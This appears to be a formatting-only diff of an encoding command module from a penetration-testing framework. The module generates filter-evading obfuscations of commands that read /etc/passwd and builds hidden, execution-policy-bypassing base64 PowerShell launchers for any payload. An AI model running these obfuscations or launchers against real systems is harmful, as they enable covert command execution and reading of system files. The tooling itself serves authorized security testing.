@@ -229,7 +229,6 @@ class EncodingCommandSet(LazyOwnCommandSet):
         Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
         """
 
-
         parts = line.split(" ")
         if len(parts) != 2:
             print_error("Usage: rot <number> extension example: rot 13 js")
@@ -251,7 +250,7 @@ class EncodingCommandSet(LazyOwnCommandSet):
         file_name = text.replace(f".{ext}", f"_rotated_{number}.{ext}")
 
         rotated_text = "".join(rotate_char(c, number) for c in content)
-        with open(file_name, 'w') as f:
+        with open(file_name, "w") as f:
             f.write(rotated_text)
         copy2clip(rotated_text)
         return
@@ -278,6 +277,7 @@ class EncodingCommandSet(LazyOwnCommandSet):
         """
 
         try:
+
             def double_base64_encode(cmd):
                 """
                 Perform double Base64 encoding on the given command.
@@ -341,11 +341,11 @@ class EncodingCommandSet(LazyOwnCommandSet):
                     "p\\\\i\\\n\\\\g",
                     "cat ${HOME:0:1}etc${HOME:0:1}passwd",
                     "cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
-                    "echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
-                    "cat $(echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
+                    'echo -e "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"',
+                    'cat $(echo -e "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64")',
                     f"abc=${'$'}'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'; cat abc",
-                    "$(printf %.1s \"$PWD\")bin$(printf %.1s \"$PWD\")ls",
-                    "while read -r line; do echo $line; done < /etc/passwd"
+                    '$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls',
+                    "while read -r line; do echo $line; done < /etc/passwd",
                 ]
                 return obfuscations
 
@@ -379,8 +379,8 @@ class EncodingCommandSet(LazyOwnCommandSet):
         """
         if line:
             # Encode the input line to Base64
-            encoded_bytes = base64.b64encode(line.encode('utf-8'))
-            encoded_str = encoded_bytes.decode('utf-8')
+            encoded_bytes = base64.b64encode(line.encode("utf-8"))
+            encoded_str = encoded_bytes.decode("utf-8")
             print_msg(encoded_str)
         else:
             print_error("Error: No input provided for encoding.")
@@ -409,7 +409,7 @@ class EncodingCommandSet(LazyOwnCommandSet):
             try:
                 # Decode the Base64 encoded line
                 decoded_bytes = base64.b64decode(line)
-                decoded_str = decoded_bytes.decode('utf-8')
+                decoded_str = decoded_bytes.decode("utf-8")
                 print_msg(decoded_str)
             except Exception as e:
                 print_error(f"Error decoding Base64 string: {e}")
@@ -439,12 +439,16 @@ class EncodingCommandSet(LazyOwnCommandSet):
             [Outputs the encoded PowerShell commands and copies the final command to the clipboard]
         """
         if not line:
-            line = input('    [!] enter the payload (default; whoami): ') or 'whoami'
+            line = input("    [!] enter the payload (default; whoami): ") or "whoami"
 
-        utf16_payload = line.encode('utf-16le')
-        base64_payload = base64.b64encode(utf16_payload).decode('utf-8')
-        final_command = f"cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_payload}"
-        final_final_command = f"cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}"
+        utf16_payload = line.encode("utf-16le")
+        base64_payload = base64.b64encode(utf16_payload).decode("utf-8")
+        final_command = (
+            f"cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_payload}"
+        )
+        final_final_command = (
+            f"cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}"
+        )
         payloads = f"""
         cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}
         cmd.exe /c powershell.exe -ExecutionPolicy ByPass /Window Hi -Enco {base64_payload}
@@ -495,8 +499,8 @@ class EncodingCommandSet(LazyOwnCommandSet):
         None: The hexadecimal equivalent of the IP address is printed to the console.
         """
         try:
-            octets = line.strip().split('.')
-            hex_value = ''.join([format(int(octet), '02x') for octet in octets])
+            octets = line.strip().split(".")
+            hex_value = "".join([format(int(octet), "02x") for octet in octets])
             print_msg(f"Hexadecimal representation: {hex_value}")
         except ValueError:
             print_error("Invalid IP address format. Please provide a valid IPv4 address.")
@@ -534,13 +538,14 @@ class EncodingCommandSet(LazyOwnCommandSet):
             hex_values.extend(parts[1:])
         hex_values = [byte for byte in hex_values if len(byte) == 2]
 
-        plaintext = ''.join(chr(int(byte, 16)) for byte in hex_values if all(c in '0123456789abcdefABCDEF' for c in byte))
+        plaintext = "".join(
+            chr(int(byte, 16)) for byte in hex_values if all(c in "0123456789abcdefABCDEF" for c in byte)
+        )
 
         print_msg("Plain text:")
         file_plain = "sessions/request_plaintext.txt"
-        with open(file_plain, 'w') as plain:
+        with open(file_plain, "w") as plain:
             plain.write(plaintext)
 
         print_msg(plaintext)
         return
-
